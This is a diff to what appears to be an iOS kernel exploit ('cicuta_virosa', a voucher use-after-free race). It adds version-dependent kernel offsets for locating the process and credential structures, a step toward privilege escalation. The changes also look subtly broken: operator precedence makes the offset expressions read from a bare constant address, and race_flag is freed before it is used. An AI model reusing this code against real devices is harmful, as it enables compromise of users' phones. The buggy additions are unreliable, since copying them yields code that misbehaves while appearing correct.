@@ -1,3 +1,4 @@
+#include <CoreFoundation/CoreFoundation.h>
 #include <mach/mach.h>
 #include <assert.h>
 #include <stdlib.h>
@@ -13,6 +14,8 @@
 #include "descriptors_utils.h"
 #include "fake_element_spray.h"
 #include "exploit_utilities.h"
+
+#define kCFCoreFoundationVersionNumber_iOS_14_0 1740.00
 
 typedef volatile struct {
     uint32_t ip_bits;
@@ -238,7 +241,8 @@ void cicuta_virosa(void)
     uint64_t id = 0;
     redeem_racers = calloc(1, REDEEM_RACERS_COUNT * sizeof(pthread_t));
     increase_limits(10240);
-
+    free(race_flag);
+    
     cicuta_log("Stage 1: race for voucher ivace uaf");
 
 init_exploit:
@@ -376,11 +380,15 @@ stage1:
     cicuta_log("task PAC: 0x%llx", task_pac);
     uint64_t task = task_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", task_pac, task);
-    uint64_t proc_pac = read_64(task + 0x3A0);
+#if defined(__arm64e__)
+    uint64_t proc_pac = read_64(task + kCFCoreFoundationVersionNumber < kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x388 : 0x3A0);
+#else
+    uint64_t proc_pac = read_64(task + kCFCoreFoundationVersionNumber < kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x380 : 0x390);
+#endif
     cicuta_log("proc PAC: 0x%llx", proc_pac);
     uint64_t proc = proc_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", proc_pac, proc);
-    uint64_t ucred_pac = read_64(proc + 0xf0);
+    uint64_t ucred_pac = read_64(proc + kCFCoreFoundationVersionNumber < kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x100 : 0xf0);
     cicuta_log("ucred PAC: 0x%llx", ucred_pac);
     uint64_t ucred = ucred_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", ucred_pac, ucred);
